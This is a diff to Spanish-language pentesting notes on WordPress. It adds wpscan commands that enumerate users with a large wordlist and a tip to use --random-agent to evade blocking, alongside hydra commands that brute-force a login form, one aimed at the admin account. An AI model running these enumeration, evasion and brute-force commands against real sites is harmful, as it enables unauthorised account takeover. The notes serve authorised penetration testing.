@@ -76,9 +76,18 @@ Proseguimos a encontrar usuarios validos para 'WP'.
 
 `wpscan -u "http://ip/" --enumerate u` # Enumeramos usuarios
 
+`wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt` # Enumeramos usuarios con wordlists.
+
+Una forma de bypassear posibles bloqueos es jugar con el parámetro --random-agent, de la siguiente forma:
+
+`$~ wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt  --random-agent`
+
 Tambien es posible enumerar usuarios validos si aplicamos fuerza bruta con hydra. Tenemos que ver si hay fuga de información.
 
 `hydra -L dict_Users.txt -p test <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para listar usuarios.
 
 `hydra -l admin -P dict_Password.txt <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para el usuario admin.
+
+
+
 
